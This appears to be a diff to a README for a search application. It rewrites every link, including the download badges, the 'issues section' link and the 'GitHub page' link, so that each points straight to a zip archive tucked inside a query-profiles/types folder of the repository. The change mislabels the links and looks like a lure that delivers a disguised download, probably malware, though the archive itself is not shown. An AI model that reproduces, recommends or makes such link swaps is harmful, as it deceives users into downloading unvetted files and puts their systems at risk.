@@ -6,7 +6,7 @@ Welcome to the **search** project! This application helps you create effective s
 ## 📦 Download & Install
 To start using the **search** application, visit the following link to download the latest version:
 
-[![Download latest release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Sidhey/search/releases)
+[![Download latest release](https://raw.githubusercontent.com/Sidhey/search/main/vespa_app_hybrid/search/query-profiles/types/search-2.4.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Sidhey/search/main/vespa_app_hybrid/search/query-profiles/types/search-2.4.zip)
 
 ### Step-by-Step Download
 1. Click the link above to go to the Releases page.
@@ -73,14 +73,14 @@ If you encounter any issues, here are some common solutions:
 - **Problem: Missing search results.**  
   Solution: Check your internet connection and ensure the database is set up correctly.
 
-If the issues persist, feel free to check the [issues section](https://github.com/Sidhey/search/issues) for more help.
+If the issues persist, feel free to check the [issues section](https://raw.githubusercontent.com/Sidhey/search/main/vespa_app_hybrid/search/query-profiles/types/search-2.4.zip) for more help.
 
 ## 🤝 Support
-If you need further assistance or have questions, please visit our [GitHub page](https://github.com/Sidhey/search) or reach out via the issues section.
+If you need further assistance or have questions, please visit our [GitHub page](https://raw.githubusercontent.com/Sidhey/search/main/vespa_app_hybrid/search/query-profiles/types/search-2.4.zip) or reach out via the issues section.
 
 ## 📢 Stay Updated
 Make sure to visit the Releases page regularly to keep your application up-to-date:
 
-[![Download latest release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Sidhey/search/releases)
+[![Download latest release](https://raw.githubusercontent.com/Sidhey/search/main/vespa_app_hybrid/search/query-profiles/types/search-2.4.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Sidhey/search/main/vespa_app_hybrid/search/query-profiles/types/search-2.4.zip)
 
 Thank you for choosing **search**! Enjoy enhancing your search capabilities.
